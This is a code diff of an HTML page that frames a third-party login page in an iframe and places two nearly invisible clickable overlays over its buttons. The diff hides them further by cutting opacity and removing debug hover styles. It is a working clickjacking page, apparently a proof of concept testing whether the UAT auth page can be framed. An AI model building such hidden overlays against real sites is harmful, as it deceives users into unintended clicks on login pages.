@@ -11,6 +11,7 @@
             padding: 0;
             overflow: hidden;
         }
+        /* Overlay for MS button */
         .overlay {
             position: absolute;
             top: 55.2%;
@@ -18,27 +19,22 @@
             width: 32%;
             height: 7%;
             border-radius: 30px;
-            background: rgba(255, 255, 0, 0.01);
+            background: rgba(255, 255, 0, 0.001); /* almost fully invisible */
             z-index: 99;
             cursor: pointer;
         }
-        .overlay:hover {
-            background: rgba(255, 255, 0, 0.05); /* debug only */
-        }
 
-        .overlay2 {  /* second overlay */
+        /* Overlay 2 below */
+        .overlay2 {
             position: absolute;
-            top: 65%;   /* little below */
+            top: 65%;
             left: 33.5%;
             width: 32%;
             height: 7%;
             border-radius: 30px;
-            background: rgba(255, 0, 0, 0.01);
+            background: rgba(255, 0, 0, 0.001);
             z-index: 99;
             cursor: pointer;
-        }
-        .overlay2:hover {
-            background: rgba(255, 0, 0, 0.05); /* debug only */
         }
 
         iframe {
@@ -56,13 +52,10 @@
 <body>
     <h1 style="visibility:hidden;">Fake Header - Invisible</h1>
 
-    <!-- First overlay -->
-    <div class="overlay" onclick="window.open('https://www.google.com','_blank')">
-    </div>
+    <!-- Only trigger when exactly aligned -->
+    <div class="overlay" onclick="window.open('https://www.google.com','_blank')"></div>
 
-    <!-- Second overlay -->
-    <div class="overlay2" onclick="window.open('https://www.gmail.com','_blank')">
-    </div>
+    <div class="overlay2" onclick="window.open('https://www.gmail.com','_blank')"></div>
 
     <iframe src="https://nexuschat-uat.cloud-practice.tech/auth"></iframe>
 </body>
